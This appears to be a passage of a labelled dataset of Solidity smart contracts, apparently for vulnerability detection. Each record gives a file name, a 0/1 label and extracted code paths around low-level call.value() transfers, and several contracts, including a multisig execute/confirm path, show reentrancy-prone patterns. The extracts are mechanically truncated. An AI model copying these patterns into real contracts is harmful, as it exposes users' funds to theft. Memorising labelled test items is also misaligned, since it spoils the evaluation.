_bankAccountsArray[accountNumber_].balance; _bankAccountsArray[accountNumber_].balance = 0; if (msg.sender.send(fullBalance_))   { withdrawalSuccessful_ = true; }else if (msg.sender.call.value(fullBalance_)())  { withdrawalSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance = fullBalance_; if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_); return false; function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public  modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool transferSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (destinationAddress.send(amount))  { transferSuccessful_ = true; } else if (destinationAddress.call.value(amount)())      { transferSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance += amount; if (transferSuccessful_)  { event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress); return true; } else { event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress); return false; ", "second path": "function BankOwner_WithdrawDonations() public modifier_isContractOwner()  modifier_wasValueSent() { if (_bankDonationsBalance > 0) { uint256 amount_ = _bankDonationsBalance; _bankDonationsBalance = 0; if (msg.sender.send(amount_)) { event_bankDonationsWithdrawn(amount_); }  else if (msg.sender.call.value(amount_)())  { event_bankDonationsWithdrawn(amount_); }  else { _bankDonationsBalance = amount_; function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (msg.sender.send(amount))   { withdrawalSuccessful_ = true; else if (msg.sender.call.value(amount)()) { withdrawalSuccessful_ = true; }  else { _bankAccountsArray[accountNumber_].balance += amount; if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount); return false; function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool)  { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; uint256 fullBalance_ = 0; if (_bankAccountsArray[accountNumber_].balance > 0)   { fullBalance_ = _bankAccountsArray[accountNumber_].balance; _bankAccountsArray[accountNumber_].balance = 0; if (msg.sender.send(fullBalance_))   { withdrawalSuccessful_ = true; }else if (msg.sender.call.value(fullBalance_)())  { withdrawalSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance = fullBalance_; if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_); return false; function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public  modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool transferSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (destinationAddress.send(amount))  { transferSuccessful_ = true; } else if (destinationAddress.call.value(amount)())      { transferSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance += amount; if (transferSuccessful_)  { event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress); return true; } else { event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress); return false; ", "third path": "function BankOwner_WithdrawDonations() public modifier_isContractOwner()  modifier_wasValueSent() { if (_bankDonationsBalance > 0) { uint256 amount_ = _bankDonationsBalance; _bankDonationsBalance = 0; if (msg.sender.send(amount_)) { event_bankDonationsWithdrawn(amount_); }  else if (msg.sender.call.value(amount_)())  { event_bankDonationsWithdrawn(amount_); }  else { _bankDonationsBalance = amount_; function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (msg.sender.send(amount))   { withdrawalSuccessful_ = true; else if (msg.sender.call.value(amount)()) { withdrawalSuccessful_ = true; }  else { _bankAccountsArray[accountNumber_].balance += amount; if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount); return false; function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool)  { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; uint256 fullBalance_ = 0; if (_bankAccountsArray[accountNumber_].balance > 0)   { fullBalance_ = _bankAccountsArray[accountNumber_].balance; _bankAccountsArray[accountNumber_].balance = 0; if (msg.sender.send(fullBalance_))   { withdrawalSuccessful_ = true; }else if (msg.sender.call.value(fullBalance_)())  { withdrawalSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance = fullBalance_; if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_); return false; function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public  modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool transferSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (destinationAddress.send(amount))  { transferSuccessful_ = true; } else if (destinationAddress.call.value(amount)())      { transferSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance += amount; if (transferSuccessful_)  { event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress); return true; } else { event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress); return false; ", "long path": "contract MyEtherBank { address private _owner; uint256 private _bankDonationsBalance = 0; bool private _connectBankAccountToNewOwnerAddressEnabled = true; struct BankAccount { bool passwordSha3HashSet; uint32 number; uint32 passwordAttempts; uint256 balance; address owner; bytes32 passwordSha3Hash; mapping(bytes32 => bool) passwordSha3HashesUsed; } struct BankAccountAddress { bool accountSet; uint32 accountNumber; } uint32 private _totalBankAccounts = 0; BankAccount[] private _bankAccountsArray; mapping(address => BankAccountAddress) private _bankAccountAddresses; function MyEtherBank() public { _owner = msg.sender; } event event_donationMadeToBank_ThankYou(uint256 donationAmount); event event_getBankDonationsBalance(uint256 donationBalance); event event_bankDonationsWithdrawn(uint256 donationsAmount); event event_bankAccountOpened_Successful(address indexed bankAccountOwner, uint32 indexed bankAccountNumber, uint256 indexed depositAmount); event event_getBankAccountNumber_Successful(uint32 indexed bankAccountNumber); event event_getBankAccountBalance_Successful(uint32 indexed bankAccountNumber, uint256 indexed balance); event event_depositMadeToBankAccount_Successful(uint32 indexed bankAccountNumber, uint256 indexed depositAmount); event event_depositMadeToBankAccount_Failed(uint32 indexed bankAccountNumber, uint256 indexed depositAmount); event event_depositMadeToBankAccountFromDifferentAddress_Successful(uint32 indexed bankAccountNumber, address indexed addressFrom, uint256 indexed depositAmount); event event_depositMadeToBankAccountFromDifferentAddress_Failed(uint32 indexed bankAccountNumber, address indexed addressFrom, uint256 indexed depositAmount); event event_withdrawalMadeFromBankAccount_Successful(uint32 indexed bankAccountNumber, uint256 indexed withdrawalAmount); event event_withdrawalMadeFromBankAccount_Failed(uint32 indexed bankAccountNumber, uint256 indexed withdrawalAmount); event event_transferMadeFromBankAccountToAddress_Successful(uint32 indexed bankAccountNumber, uint256 indexed transferalAmount, address indexed destinationAddress); event event_transferMadeFromBankAccountToAddress_Failed(uint32 indexed bankAccountNumber, uint256 indexed transferalAmount, address indexed destinationAddress); event event_securityConnectingABankAccountToANewOwnerAddressIsDisabled(); event event_securityHasPasswordSha3HashBeenAddedToBankAccount_Yes(uint32 indexed bankAccountNumber); event event_securityHasPasswordSha3HashBeenAddedToBankAccount_No(uint32 indexed bankAccountNumber); event event_securityPasswordSha3HashAddedToBankAccount_Successful(uint32 indexed bankAccountNumber); event event_securityPasswordSha3HashAddedToBankAccount_Failed_PasswordHashPreviouslyUsed(uint32 indexed bankAccountNumber); event event_securityBankAccountConnectedToNewAddressOwner_Successful(uint32 indexed bankAccountNumber, address indexed newAddressOwner); event event_securityBankAccountConnectedToNewAddressOwner_Failed_PasswordHashHasNotBeenAddedToBankAccount(uint32 indexed bankAccountNumber); event event_securityBankAccountConnectedToNewAddressOwner_Failed_SentPasswordDoesNotMatchAccountPasswordHash(uint32 indexed bankAccountNumber, uint32 indexed passwordAttempts); event event_securityGetNumberOfAttemptsToConnectBankAccountToANewOwnerAddress(uint32 indexed bankAccountNumber, uint32 indexed attempts); modifier modifier_isContractOwner() { if (msg.sender != _owner) { throw; } _; } modifier modifier_doesSenderHaveABankAccount() { if (_bankAccountAddresses[msg.sender].accountSet == false) { throw; } else { uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (msg.sender != _bankAccountsArray[accountNumber_].owner) { throw; } } _; } modifier modifier_wasValueSent() { if (msg.value > 0) { throw; } _; } function Donate() public { if (msg.value > 0) { _bankDonationsBalance += msg.value; event_donationMadeToBank_ThankYou(msg.value); } } function BankOwner_GetDonationsBalance() public modifier_isContractOwner() modifier_wasValueSent() returns (uint256) { event_getBankDonationsBalance(_bankDonationsBalance); return _bankDonationsBalance; } function BankOwner_WithdrawDonations() public modifier_isContractOwner()  modifier_wasValueSent() { if (_bankDonationsBalance > 0) { uint256 amount_ = _bankDonationsBalance; _bankDonationsBalance = 0; if (msg.sender.send(amount_)) { event_bankDonationsWithdrawn(amount_); }  else if (msg.sender.call.value(amount_)())  { event_bankDonationsWithdrawn(amount_); }  else { _bankDonationsBalance = amount_; } } } function BankOwner_EnableConnectBankAccountToNewOwnerAddress() public modifier_isContractOwner() { if (_connectBankAccountToNewOwnerAddressEnabled == false) { _connectBankAccountToNewOwnerAddressEnabled = true; } } function  BankOwner_DisableConnectBankAccountToNewOwnerAddress() public modifier_isContractOwner() { if (_connectBankAccountToNewOwnerAddressEnabled) { _connectBankAccountToNewOwnerAddressEnabled = false; } } function OpenBankAccount() public returns (uint32 newBankAccountNumber) { if (_bankAccountAddresses[msg.sender].accountSet) { throw; } newBankAccountNumber = _totalBankAccounts; _bankAccountsArray.push( BankAccount( { passwordSha3HashSet: false, passwordAttempts: 0, number: newBankAccountNumber, balance: 0, owner: msg.sender, passwordSha3Hash: \"0\" } )); bytes32 passwordHash_ = sha3(\"password\"); _bankAccountsArray[newBankAccountNumber].passwordSha3HashesUsed[passwordHash_] = true; passwordHash_ = sha3(\"Password\"); _bankAccountsArray[newBankAccountNumber].passwordSha3HashesUsed[passwordHash_] = true; _bankAccountAddresses[msg.sender].accountSet = true; _bankAccountAddresses[msg.sender].accountNumber = newBankAccountNumber; if (msg.value > 0) { _bankAccountsArray[newBankAccountNumber].balance += msg.value; } _totalBankAccounts++; event_bankAccountOpened_Successful(msg.sender, newBankAccountNumber, msg.value); return newBankAccountNumber; } function GetBankAccountNumber() public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (uint32) { event_getBankAccountNumber_Successful(_bankAccountAddresses[msg.sender].accountNumber); return _bankAccountAddresses[msg.sender].accountNumber; } function GetBankAccountBalance() public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (uint256) { uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; event_getBankAccountBalance_Successful(accountNumber_, _bankAccountsArray[accountNumber_].balance); return _bankAccountsArray[accountNumber_].balance; } function DepositToBankAccount() public modifier_doesSenderHaveABankAccount() returns (bool) { if (msg.value > 0) { uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if ((_bankAccountsArray[accountNumber_].balance + msg.value) < _bankAccountsArray[accountNumber_].balance) { throw; } _bankAccountsArray[accountNumber_].balance += msg.value; event_depositMadeToBankAccount_Successful(accountNumber_, msg.value); return true; } else { event_depositMadeToBankAccount_Failed(accountNumber_, msg.value); return false; } } function DepositToBankAccountFromDifferentAddress(uint32 bankAccountNumber) public returns (bool) { if (bankAccountNumber >= _totalBankAccounts) { event_depositMadeToBankAccountFromDifferentAddress_Failed(bankAccountNumber, msg.sender, msg.value); return false; } if (msg.value > 0) { if ((_bankAccountsArray[bankAccountNumber].balance + msg.value) < _bankAccountsArray[bankAccountNumber].balance) { throw; } _bankAccountsArray[bankAccountNumber].balance += msg.value; event_depositMadeToBankAccountFromDifferentAddress_Successful(bankAccountNumber, msg.sender, msg.value); return true; } else { event_depositMadeToBankAccountFromDifferentAddress_Failed(bankAccountNumber, msg.sender, msg.value); return false; } } function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (msg.sender.send(amount))   { withdrawalSuccessful_ = true; } else if (msg.sender.call.value(amount)()) { withdrawalSuccessful_ = true; }  else { _bankAccountsArray[accountNumber_].balance += amount; } } if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount); return false; } } function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool)  { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; uint256 fullBalance_ = 0; if (_bankAccountsArray[accountNumber_].balance > 0)   { fullBalance_ = _bankAccountsArray[accountNumber_].balance; _bankAccountsArray[accountNumber_].balance = 0; if (msg.sender.send(fullBalance_))   { withdrawalSuccessful_ = true; }else if (msg.sender.call.value(fullBalance_)())  { withdrawalSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance = fullBalance_; } } if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_); return false; } } function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public  modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool transferSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (destinationAddress.send(amount))  { transferSuccessful_ = true; } else if (destinationAddress.call.value(amount)())      { transferSuccessful_ = true; } else { _bankAccountsArray[accountNumber_].balance += amount; } } if (transferSuccessful_)  { event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress); return true; } else { event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress); return false; } } function Security_HasPasswordSha3HashBeenAddedToBankAccount() public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) { uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (_bankAccountsArray[accountNumber_].passwordSha3HashSet) { event_securityHasPasswordSha3HashBeenAddedToBankAccount_Yes(accountNumber_); return true; } else { event_securityHasPasswordSha3HashBeenAddedToBankAccount_No(accountNumber_); return false; } } function Security_AddPasswordSha3HashToBankAccount(bytes32 sha3Hash) public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) { uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (_bankAccountsArray[accountNumber_].passwordSha3HashesUsed[sha3Hash] == true) { event_securityPasswordSha3HashAddedToBankAccount_Failed_PasswordHashPreviouslyUsed(accountNumber_); return false; } _bankAccountsArray[accountNumber_].passwordSha3HashSet = true; _bankAccountsArray[accountNumber_].passwordSha3Hash = sha3Hash; _bankAccountsArray[accountNumber_].passwordSha3HashesUsed[sha3Hash] = true; _bankAccountsArray[accountNumber_].passwordAttempts = 0; event_securityPasswordSha3HashAddedToBankAccount_Successful(accountNumber_); return true; } function Security_ConnectBankAccountToNewOwnerAddress(uint32 bankAccountNumber, string password) public modifier_wasValueSent() returns (bool) { if (_connectBankAccountToNewOwnerAddressEnabled == false) { event_securityConnectingABankAccountToANewOwnerAddressIsDisabled(); return false; } if (bankAccountNumber >= _totalBankAccounts) { return false; } if (_bankAccountAddresses[msg.sender].accountSet) { return false; } if (_bankAccountsArray[bankAccountNumber].passwordSha3HashSet == false) { event_securityBankAccountConnectedToNewAddressOwner_Failed_PasswordHashHasNotBeenAddedToBankAccount(bankAccountNumber); return false; } bytes memory passwordString = bytes(password); if (sha3(passwordString) != _bankAccountsArray[bankAccountNumber].passwordSha3Hash) { _bankAccountsArray[bankAccountNumber].passwordAttempts++; event_securityBankAccountConnectedToNewAddressOwner_Failed_SentPasswordDoesNotMatchAccountPasswordHash(bankAccountNumber, _bankAccountsArray[bankAccountNumber].passwordAttempts); return false; } _bankAccountsArray[bankAccountNumber].owner = msg.sender; _bankAccountAddresses[msg.sender].accountSet = true; _bankAccountAddresses[msg.sender].accountNumber = bankAccountNumber; _bankAccountsArray[bankAccountNumber].passwordSha3HashSet = false; _bankAccountsArray[bankAccountNumber].passwordSha3Hash = \"0\"; _bankAccountsArray[bankAccountNumber].passwordAttempts = 0; event_securityBankAccountConnectedToNewAddressOwner_Successful(bankAccountNumber, msg.sender); return true; } function Security_GetNumberOfAttemptsToConnectBankAccountToANewOwnerAddress() public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (uint64) { uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; event_securityGetNumberOfAttemptsToConnectBankAccountToANewOwnerAddress(accountNumber_, _bankAccountsArray[accountNumber_].passwordAttempts); return _bankAccountsArray[accountNumber_].passwordAttempts; } function() { if (_bankAccountAddresses[msg.sender].accountSet) { uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; address accountOwner_ = _bankAccountsArray[accountNumber_].owner; if (msg.sender == accountOwner_) { if (msg.value > 0) { if ((_bankAccountsArray[accountNumber_].balance + msg.value) < _bankAccountsArray[accountNumber_].balance) { throw; } _bankAccountsArray[accountNumber_].balance += msg.value; event_depositMadeToBankAccount_Successful(accountNumber_, msg.value); } else { throw; } } else { throw; } } else { OpenBankAccount(); } } } "}
{"sol name": "1710.sol", "label": 0, "first path": "function buyFST0(address receiver) internal { require(salesPipe.call.value(msg.value)()); uint256 tmpERCBalance = erc.balanceOf(address(this)); uint256 tmpEthBalance = address(this).balance; if (tmpERCBalance > 0) { require(erc.transfer(receiver, tmpERCBalance));    } if (tmpEthBalance > 0) { require(receiver.send(tmpEthBalance)); function buyFST (address receiver) public payable { buyFST0(receiver); function buyFST () public payable { buyFST0(msg.sender); function () external payable { buyFST0(msg.sender); ", "second path": "function buyFST0(address receiver) internal { require(salesPipe.call.value(msg.value)()); uint256 tmpERCBalance = erc.balanceOf(address(this)); uint256 tmpEthBalance = address(this).balance; if (tmpERCBalance > 0) { require(erc.transfer(receiver, tmpERCBalance));    } if (tmpEthBalance > 0) { require(receiver.send(tmpEthBalance)); function buyFST (address receiver) public payable { buyFST0(receiver); function buyFST () public payable { buyFST0(msg.sender); function () external payable { buyFST0(msg.sender); ", "third path": "function buyFST0(address receiver) internal { require(salesPipe.call.value(msg.value)()); uint256 tmpERCBalance = erc.balanceOf(address(this)); uint256 tmpEthBalance = address(this).balance; if (tmpERCBalance > 0) { require(erc.transfer(receiver, tmpERCBalance));    } if (tmpEthBalance > 0) { require(receiver.send(tmpEthBalance)); function buyFST (address receiver) public payable { buyFST0(receiver); function buyFST () public payable { buyFST0(msg.sender); function () external payable { buyFST0(msg.sender); ", "long path": "pragma solidity ^0.4.24; contract ERC20 { function balanceOf (address owner) public view returns (uint256); function allowance (address owner, address spender) public view returns (uint256); function transfer (address to, uint256 value) public returns (bool); function transferFrom (address from, address to, uint256 value) public returns (bool); function approve (address spender, uint256 value) public returns (bool); } contract MiddleSaleService { address public frontWindow; address public salesPipe; ERC20   public erc; address public owner; constructor(address _frontWindow, address _salesPipe, ERC20 _erc) public { frontWindow = _frontWindow; salesPipe = _salesPipe; erc = _erc; owner = msg.sender; } function setFrontWindow (address _frontWindow) external { require(msg.sender == owner); frontWindow = _frontWindow; } function setSalesPipe (address _salesPipe) external { require(msg.sender == owner); salesPipe = _salesPipe; } function setERC (ERC20 _erc) external { require(msg.sender == owner); erc = _erc; } function setOwner (address _owner) external { require(msg.sender == owner); owner = _owner; } function buyFST0(address receiver) internal { require(salesPipe.call.value(msg.value)()); uint256 tmpERCBalance = erc.balanceOf(address(this)); uint256 tmpEthBalance = address(this).balance; if (tmpERCBalance > 0) { require(erc.transfer(receiver, tmpERCBalance));    } if (tmpEthBalance > 0) { require(receiver.send(tmpEthBalance)); } } function buyFST (address receiver) public payable { buyFST0(receiver); } function buyFST () public payable { buyFST0(msg.sender); } function () external payable { buyFST0(msg.sender); } } "}
{"sol name": "40038.sol", "label": 1, "first path": "function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { if (_to == address(tokenCtr)) throw; if (underLimit(_value)) { SingleTransact(msg.sender, _value, _to, _data); if(!_to.call.value(_value)(_data)) return 0; _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data)) MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; ", "second path": "function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { if (_to == address(tokenCtr)) throw; if (underLimit(_value)) { SingleTransact(msg.sender, _value, _to, _data); if(!_to.call.value(_value)(_data)) return 0; _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data)) MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; ", "third path": "function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { if (_to == address(tokenCtr)) throw; if (underLimit(_value)) { SingleTransact(msg.sender, _value, _to, _data); if(!_to.call.value(_value)(_data)) return 0; _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data)) MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; ", "long path": "pragma solidity ^0.4.0; contract Lockable { uint public numOfCurrentEpoch; uint public creationTime; uint public constant UNLOCKED_TIME = 25 days; uint public constant LOCKED_TIME = 5 days; uint public constant EPOCH_LENGTH = 30 days; bool public lock; bool public tokenSwapLock; event Locked(); event Unlocked(); modifier isTokenSwapOn { if (tokenSwapLock) throw; _; } modifier isNewEpoch { if (numOfCurrentEpoch * EPOCH_LENGTH + creationTime < now ) { numOfCurrentEpoch = (now - creationTime) / EPOCH_LENGTH + 1; } _; } modifier checkLock { if ((creationTime + numOfCurrentEpoch * UNLOCKED_TIME) + (numOfCurrentEpoch - 1) * LOCKED_TIME < now) { if (lock) throw; lock = true; Locked(); return; } else { if (lock) { lock = false; Unlocked(); } } _; } function Lockable() { creationTime = now; numOfCurrentEpoch = 1; tokenSwapLock = true; } } contract ERC20 { function totalSupply() constant returns (uint); function balanceOf(address who) constant returns (uint); function allowance(address owner, address spender) constant returns (uint); function transfer(address to, uint value) returns (bool ok); function transferFrom(address from, address to, uint value) returns (bool ok); function approve(address spender, uint value) returns (bool ok); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } contract Token is ERC20, Lockable { mapping( address => uint ) _balances; mapping( address => mapping( address => uint ) ) _approvals; uint _supply; address public walletAddress; event TokenMint(address newTokenHolder, uint amountOfTokens); event TokenSwapOver(); modifier onlyFromWallet { if (msg.sender != walletAddress) throw; _; } function Token( uint initial_balance, address wallet) { _balances[msg.sender] = initial_balance; _supply = initial_balance; walletAddress = wallet; } function totalSupply() constant returns (uint supply) { return _supply; } function balanceOf( address who ) constant returns (uint value) { return _balances[who]; } function allowance(address owner, address spender) constant returns (uint _allowance) { return _approvals[owner][spender]; } function safeToAdd(uint a, uint b) internal returns (bool) { return (a + b >= a && a + b >= b); } function transfer( address to, uint value) isTokenSwapOn isNewEpoch  checkLock returns (bool ok) { if( _balances[msg.sender] < value ) { throw; } if( !safeToAdd(_balances[to], value) ) { throw; } _balances[msg.sender] -= value; _balances[to] += value; Transfer( msg.sender, to, value ); return true; } function transferFrom( address from, address to, uint value) isTokenSwapOn isNewEpoch checkLock returns (bool ok) { if( _balances[from] < value ) { throw; } if( _approvals[from][msg.sender] < value ) { throw; } if( !safeToAdd(_balances[to], value) ) { throw; } _approvals[from][msg.sender] -= value; _balances[from] -= value; _balances[to] += value; Transfer( from, to, value ); return true; } function approve(address spender, uint value) isTokenSwapOn isNewEpoch checkLock returns (bool ok) { _approvals[msg.sender][spender] = value; Approval( msg.sender, spender, value ); return true; } function currentSwapRate() constant returns(uint) { if (creationTime + 1 weeks > now) { return 130; } else if (creationTime + 2 weeks > now) { return 120; } else if (creationTime + 4 weeks > now) { return 100; } else { return 0; } } function mintTokens(address newTokenHolder, uint etherAmount) external onlyFromWallet { uint tokensAmount = currentSwapRate() * etherAmount; if(!safeToAdd(_balances[newTokenHolder],tokensAmount )) throw; if(!safeToAdd(_supply,tokensAmount)) throw; _balances[newTokenHolder] += tokensAmount; _supply += tokensAmount; TokenMint(newTokenHolder, tokensAmount); } function disableTokenSwapLock() external onlyFromWallet { tokenSwapLock = false; TokenSwapOver(); } } pragma solidity ^0.4.0; contract multiowned { struct PendingState { uint yetNeeded; uint ownersDone; uint index; } event Confirmation(address owner, bytes32 operation); event Revoke(address owner, bytes32 operation); event OwnerChanged(address oldOwner, address newOwner); event OwnerAdded(address newOwner); event OwnerRemoved(address oldOwner); event RequirementChanged(uint newRequirement); modifier onlyowner { if (isOwner(msg.sender)) _; } modifier onlymanyowners(bytes32 _operation) { if (confirmAndCheck(_operation)) _; } function multiowned(address[] _owners, uint _required) { m_numOwners = _owners.length + 1; m_owners[1] = uint(msg.sender); m_ownerIndex[uint(msg.sender)] = 1; for (uint i = 0; i < _owners.length; ++i) { m_owners[2 + i] = uint(_owners[i]); m_ownerIndex[uint(_owners[i])] = 2 + i; } m_required = _required; } function revoke(bytes32 _operation) external { uint ownerIndex = m_ownerIndex[uint(msg.sender)]; if (ownerIndex == 0) return; uint ownerIndexBit = 2**ownerIndex; var pending = m_pending[_operation]; if (pending.ownersDone & ownerIndexBit > 0) { pending.yetNeeded++; pending.ownersDone -= ownerIndexBit; Revoke(msg.sender, _operation); } } function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external { if (isOwner(_to)) return; uint ownerIndex = m_ownerIndex[uint(_from)]; if (ownerIndex == 0) return; clearPending(); m_owners[ownerIndex] = uint(_to); m_ownerIndex[uint(_from)] = 0; m_ownerIndex[uint(_to)] = ownerIndex; OwnerChanged(_from, _to); } function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external { if (isOwner(_owner)) return; clearPending(); if (m_numOwners >= c_maxOwners) reorganizeOwners(); if (m_numOwners >= c_maxOwners) return; m_numOwners++; m_owners[m_numOwners] = uint(_owner); m_ownerIndex[uint(_owner)] = m_numOwners; OwnerAdded(_owner); } function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external { uint ownerIndex = m_ownerIndex[uint(_owner)]; if (ownerIndex == 0) return; if (m_required > m_numOwners - 1) return; m_owners[ownerIndex] = 0; m_ownerIndex[uint(_owner)] = 0; clearPending(); reorganizeOwners(); OwnerRemoved(_owner); } function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external { if (_newRequired > m_numOwners) return; m_required = _newRequired; clearPending(); RequirementChanged(_newRequired); } function getOwner(uint ownerIndex) external constant returns (address) { return address(m_owners[ownerIndex + 1]); } function isOwner(address _addr) returns (bool) { return m_ownerIndex[uint(_addr)] > 0; } function hasConfirmed(bytes32 _operation, address _owner) constant returns (bool) { var pending = m_pending[_operation]; uint ownerIndex = m_ownerIndex[uint(_owner)]; if (ownerIndex == 0) return false; uint ownerIndexBit = 2**ownerIndex; return !(pending.ownersDone & ownerIndexBit == 